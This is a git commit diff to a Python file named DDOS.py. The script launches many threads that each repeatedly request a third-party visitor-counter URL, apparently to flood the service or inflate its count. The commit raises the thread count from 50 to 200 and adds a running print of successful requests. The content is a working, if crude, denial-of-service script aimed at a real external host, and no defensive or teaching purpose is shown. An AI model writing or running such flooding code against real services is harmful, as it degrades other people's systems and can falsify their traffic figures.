1b02a83eac77455a0cc77e1a1845a84b7fe29903
KExer <45463774+KExer@users.noreply.github.com>
2019-10-28 09:07:26 +0100

    32

--- DDOS.py
+++ DDOS.py
@@ -5,6 +5,7 @@ from time import sleep
 URL = "http://counter5.01counter.com/private/contadorvisitasgratis.php?c=cc752f03e9eb758405927ce708942ebf"
 
 requests_count = 0
+threads_count = 200
 
 def requestPage(URL, threadNumber):
     global requests_count
@@ -12,8 +13,9 @@ def requestPage(URL, threadNumber):
         r = requests.get(URL)
         if r.status_code == 200:
             requests_count += 1
+            print(requests_count)
 
-for i in range(50):
+for i in range(threads_count):
     x = threading.Thread(target=requestPage, args=(URL, i,))
     x.start()
 
